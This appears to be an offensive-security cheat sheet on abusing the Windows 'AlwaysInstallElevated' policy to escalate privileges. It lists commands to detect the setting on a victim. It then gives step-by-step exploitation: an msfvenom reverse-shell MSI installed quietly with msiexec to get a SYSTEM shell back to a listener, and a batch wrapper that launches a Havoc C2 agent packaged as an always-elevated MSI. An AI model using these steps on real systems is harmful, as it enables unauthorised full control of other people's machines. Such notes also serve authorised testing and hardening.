If this option is enabled then every msi that is installed by whatever user it will be installed as NT SYSTEM.

## How to enable (VIA GPO)
Check if "Always install with elevated privileges" are enabled under following paths:
```
    Computer Configuration\Administrative Templates\Windows Components\Windows Installer
    User Configuration\Administrative Templates\Windows Components\Windows Installer
```

## How to check if enabled on victim
```
Run winpeas
OR
./SharpUP.exe audit (PREFERRED)
OR MANUALLY
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

## How to Exploit
```
1)Prepare a revshell with MSFVENOM and save it as .msi
2)Upload to victim
3)Setup a Listener on your machine
4)Install the MSI and execute it quietly
msiexec /i PATH/TO/MALICIOUS.MSI /quiet /qn /norestart
5)You should get a revshell into listener as NT SYSTEM
```

### Better guide (**Windows required**)
```
Import-Module ./PoweUp.ps1 
Invoke-AllChecks  
```
(If you find that you can install as elevated then bingo)
Install msi wrapper(free) works: https://www.exemsi.com/download/
Write a BAT that does the task you need 
Example(Running Havoc):
```
@echo off
:: Define the path to havoc.exe
set EXE_PATH=C:\temp\havoc.exe

:: Execute the command
"%EXE_PATH%"

:: Inform the user about the operation's success
echo "havoc.exe has been executed."
pause
```
To wrap to MSI:
```
Point to the wrap, and choose max compression.
On security context choose these settings(IMPORTANT): Windows Installer, Always elevated, Per User, Msi requires elevation
Lastly edit vesion, producer etc.
And build.
```
On victim to install:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
